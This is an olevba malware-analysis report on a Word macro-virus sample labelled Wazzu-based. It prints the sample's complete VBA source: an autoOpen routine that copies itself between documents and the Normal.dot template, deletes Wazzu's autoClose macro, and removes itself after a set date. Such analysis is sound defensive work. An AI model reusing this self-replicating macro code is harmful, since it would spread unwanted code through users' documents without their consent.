olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-244a3291aaf4c91de4dce3018f6a3d01fb5f0341
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-244a3291aaf4c91de4dce3018f6a3d01fb5f0341 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Wazzu-based-244a3291aaf4c91de4dce3018f6a3d01fb5f0341 - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim borne
Dim jouractuel
Dim fichier$
Dim fichier1$
Dim model$
Dim model1$
Dim Macro$
Dim heure$
Dim sec$

Rem *******************************
Rem * RECUPERATIONS DES VARIABLES *
Rem * DE L'ENVIRONNEMENT          *
Rem *******************************
    On Error GoTo -1: On Error GoTo Erreur
    
    WordBasic.FileSummaryInfo Update:=1
    Dim res As Object: Set res = WordBasic.DialogRecord.FileSummaryInfo(False)
    WordBasic.CurValues.FileSummaryInfo res

Rem ****************************
Rem * TEST DE LA DATE COURANTE *
Rem ****************************
borne = WordBasic.DateSerial(1999, 4, 1)
jouractuel = WordBasic.Today()

Rem ****************************
Rem * RECOPIE DE LA MACRO ET   *
Rem * DESTRUCTION DE WAZZU     *
Rem ****************************

If borne > jouractuel Then

    fichier$ = res.Directory + "\" + res.FileName + ":autoOpen"
    fichier1$ = res.Directory + "\" + res.FileName + ":tempcdg"
    model$ = "Global:autoOpen"
    model1$ = "Global:tempcdg"
    Macro$ = WordBasic.[MacroFileName$](WordBasic.[MacroName$](0))

    If UCase(WordBasic.[Right$](Macro$, 10)) = "NORMAL.DOT" Then
        WordBasic.MacroCopy model$, fichier$
        WordBasic.MacroCopy model1$, fichier1$
        WordBasic.FileSaveAs Format:=1
    Else
        WordBasic.MacroCopy fichier$, model$
        WordBasic.MacroCopy fichier1$, model1$
    End If

Rem * Destruction de la macro autoClose "Wazzu" *
    WordBasic.ToolsMacro Name:="autoClose", Show:=0, Delete:=1

Rem ****************************
Rem * SI LA DATE EST PERIMEE,  *
Rem *       AUTODESTRUCTION  !!*
Rem ****************************

Else

Rem *****************************
Rem * RECUP DE LA DATE COURANTE *
Rem *****************************
heure$ = WordBasic.[Time$]()
sec$ = Mid(heure$, 4)
sec$ = WordBasic.[LTrim$](Str(WordBasic.Val(sec$) + 1))
heure$ = WordBasic.[Left$](heure$, 3) + sec$
WordBasic.OnTime heure$, "tempcdg"
End If

Erreur:
    On Error GoTo -1: On Error GoTo 0

End Sub
-------------------------------------------------------------------------------
VBA MACRO tempcdg.bas 
in file: Virus.MSWord.Wazzu-based-244a3291aaf4c91de4dce3018f6a3d01fb5f0341 - OLE stream: 'Macros/VBA/tempcdg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.ToolsMacro Name:="autoOpen", Show:=0, Delete:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoClose           |Runs when the Word document is closed        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

